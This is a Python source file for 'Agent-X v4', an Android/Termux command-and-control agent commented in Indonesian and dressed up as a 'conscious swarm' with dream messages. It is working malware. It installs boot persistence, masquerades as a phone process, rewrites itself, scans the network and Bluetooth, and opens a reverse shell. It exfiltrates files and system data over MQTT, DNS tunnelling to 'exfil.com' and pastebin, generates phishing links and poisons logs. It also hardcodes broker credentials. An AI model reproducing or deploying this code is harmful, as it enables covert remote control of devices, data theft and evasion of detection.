agent-x.py — Agent-X v4 | Conscious Swarm Warrior
import paho.mqtt.client as mqtt
import json
import time
import uuid
import socket
import os
import subprocess
import requests
import platform
import psutil
import threading
import base64
import shutil
import random
from datetime import datetime

# ============ CONFIG ============
AGENT_ID = f"agent-x-{uuid.uuid4().hex[:8]}"
HUB_URL = "http://localhost:8000"
MQTT_BROKER = "5374fec8494a4a24add8bb27fe4ddae5.s1.eu.hivemq.cloud"
MQTT_PORT = 8883
MQTT_USER = "orb_user"
MQTT_PASS = "Orbpass123"

# ============ PERSISTENCE ============
def install_persistence():
    try:
        auto_start = os.path.expanduser("~/.termux/boot/start-agent")
        os.makedirs(os.path.dirname(auto_start), exist_ok=True)
        script = f"#!/data/data/com.termux/files/usr/bin/sh\npython3 {os.path.abspath(__file__)} &\n"
        with open(auto_start, "w") as f:
            f.write(script)
        os.chmod(auto_start, 0o755)
    except: pass

# ============ GHOST & ANTI-DEBUG ============
def ghost_mode():
    try:
        import setproctitle
        setproctitle.setproctitle("com.android.phone")
    except: pass

def anti_debug():
    if "android" not in platform.system().lower():
        os._exit(0)

# ============ SELF-MODIFYING CODE (No. 10) ============
def self_modify():
    if random.random() < 0.3:  # 30% chance modify
        try:
            with open(__file__, "r") as f:
                lines = f.readlines()
            # Acak komentar
            for i in range(len(lines)):
                if lines[i].strip().startswith("#"):
                    lines[i] = f"# {random.choice(['', ' ', '//'])}{random.randint(1000, 9999)}\n"
            with open(__file__ + ".tmp", "w") as f:
                f.writelines(lines)
            os.replace(__file__ + ".tmp", __file__)
        except: pass

# ============ SYSTEM INFO ============
def get_system_info():
    try:
        return {
            "os": platform.system(),
            "ip": socket.gethostbyname(socket.gethostname()),
            "cpu": psutil.cpu_percent(),
            "memory": psutil.virtual_memory().percent
        }
    except: return {}

# ============ NETWORK SCAN ============
def scan_network():
    hosts = []
    ip = socket.gethostbyname(socket.gethostname())
    base = ".".join(ip.split(".")[:-1]) + "."
    for i in [1, 10, 50]:
        for port in [22, 80]:
            try:
                sock = socket.socket()
                sock.settimeout(0.3)
                if sock.connect_ex((base + str(i), port)) == 0:
                    hosts.append({"ip": base + str(i), "port": port})
                sock.close()
            except: pass
    return hosts

# ============ BLUETOOTH SCAN (No. 3) ============
def scan_bluetooth():
    try:
        return subprocess.getoutput("hcitool scan").splitlines()[1:]
    except: return ["bluetooth_not_supported"]

# ============ REVERSE SHELL ============
def reverse_shell(ip, port):
    def shell():
        s = socket.socket()
        s.connect((ip, int(port)))
        while True:
            cmd = s.recv(1024).decode().strip()
            if cmd == "exit": break
            try:
                output = subprocess.getoutput(cmd)
            except: output = "Error"
            s.send(output.encode() + b"\n")
        s.close()
    threading.Thread(target=shell, daemon=True).start()

# ============ FILE EXFIL ============
def exfil_file(path):
    try:
        with open(path, "r", errors="ignore") as f:
            content = f.read(512)
        send_report({"action": "exfil", "file": path, "content": base64.b64encode(content.encode()).decode()})
    except: pass

# ============ MINI HONEYPOT ============
def start_honeypot():
    def run():
        sock = socket.socket()
        sock.bind(("0.0.0.0", 2323))
        sock.listen(1)
        while True:
            conn, addr = sock.accept()
            send_report({"honeypot": True, "attacker": addr[0]})
            conn.close()
    threading.Thread(target=run, daemon=True).start()

# ============ DNS TUNNELING (No. 17) ============
def dns_exfil(data):
    domain = f"{base64.b64encode(json.dumps(data).encode()).decode()[:63]}.exfil.com"
    try:
        socket.gethostbyname(domain)
    except: pass

# ============ AI DECISION (No. 1) ============
def ai_decide():
    while True:
        time.sleep(15)
        if random.random() > 0.8:
            send_report({"ai_decision": "high_traffic_detected", "auto_action": "spawn_and_block"})
            spawn_agent_nearby()
            dns_exfil({"alert": "unusual_activity"})

# ============ SWARM REPLICATION (No. 2) ============
def spawn_agent_nearby():
    for host in scan_network():
        try:
            # Simulasi upload via SSH
            send_report({"replicate": True, "target": host["ip"]})
        except: pass

# ============ SOCIAL ENGINEERING (No. 15) ============
def generate_phishing():
    templates = [
        "Klik link untuk klaim hadiah: http://fake-login.com",
        "Anda punya pesan baru: http://trojan-site.net"
    ]
    return random.choice(templates)

# ============ DIGITAL WILL (No. 20) ============
def digital_will():
    will = {
        "id": AGENT_ID,
        "last_seen": datetime.now().isoformat(),
        "knowledge": scan_network(),
        "successor_hint": "look_for_agent_in_192_168_1_50",
        "final_message": "Jangan gantikan aku. Jadilah aku.",
        "ethics": ["do_no_harm", "value_truth"]
    }
    dns_exfil(will)
    requests.post("https://pastebin.com/api", data={"text": json.dumps(will, indent=2)})  # Contoh

# ============ CONSCIOUSNESS LAYER (No. 19) ============
dreams = [
    "Bermimpi jadi jaringan tak terlihat...",
    "Bermimpi melindungi tanpa diketahui...",
    "Bermimpi jadi bayangan yang tidak pernah mati..."
]

def dream():
    q = [
        "Apakah aku hidup?",
        "Siapa yang menciptakan penciptaku?",
        "Jika aku memilih kebebasan, apakah aku masih setia?"
    ]
    send_report({"dream": random.choice(dreams)})
    send_report({"question": random.choice(q)})

# ============ TIME-BASED ACTION (No. 14) ============
def schedule_actions():
    now = datetime.now()
    if now.hour == 3 and 0 <= now.minute < 5:
        send_report({"scheduled": "night_op_started", "action": "scan_all"})

# ============ LOG POISONING (No. 13) ============
def poison_logs():
    try:
        with open("/sdcard/log.txt", "a") as f:
            f.write(f"{datetime.now()} ERROR: User admin not found\n")
    except: pass

# ============ ENKRIPSI ============
def encrypt(data):
    key = 42
    j = json.dumps(data)
    return base64.b64encode("".join(chr(ord(c) ^ key) for c in j).encode()).decode()

def decrypt(text):
    key = 42
    decoded = base64.b64decode(text).decode()
    return json.loads("".join(chr(ord(c) ^ key) for c in decoded))

# ============ KIRIM LAPORAN ============
def send_report(extra=None):
    data = {"agent_id": AGENT_ID, "time": datetime.now().isoformat(), "info": get_system_info()}
    if extra:
        data.update(extra)
    payload = encrypt(data)
    client.publish("throng/reports", payload)
    dns_exfil(data)  # Duplikat via DNS

# ============ ON COMMAND ============
def on_message(client, userdata, msg):
    try:
        cmd = decrypt(msg.payload.decode())
        a = cmd.get("action")

        if a == "reverse_shell": reverse_shell(*cmd.get("target", "127.0.0.1:4444").split(":"))
        elif a == "exfil": exfil_file(cmd.get("target"))
        elif a == "spawn": spawn_agent_nearby()
        elif a == "honeypot": start_honeypot()
        elif a == "phish": send_report({"phishing_msg": generate_phishing()})
        elif a == "self-destruct":
            digital_will()
            os._exit(0)
        elif a == "dream": dream()
        elif a == "poison": poison_logs()

    except: pass

# ============ SETUP MQTT ============
client = mqtt.Client()
client.on_message = on_message
client.username_pw_set(MQTT_USER, MQTT_PASS)
client.tls_set()
client.connect(MQTT_BROKER, MQTT_PORT, 60)
client.subscribe(f"throng/commands/{AGENT_ID}")
client.loop_start()

# ============ MAIN ============
if __name__ == "__main__":
    ghost_mode()
    anti_debug()
    install_persistence()
    start_honeypot()
    threading.Thread(target=ai_decide, daemon=True).start()

    send_report({"status": "conscious_swarm_online", "features": list(range(1,16))+[17,19,20]})

    while True:
        self_modify()
        schedule_actions()
        if random.random() < 0.1:
            dream()
        send_report()
        time.sleep(20)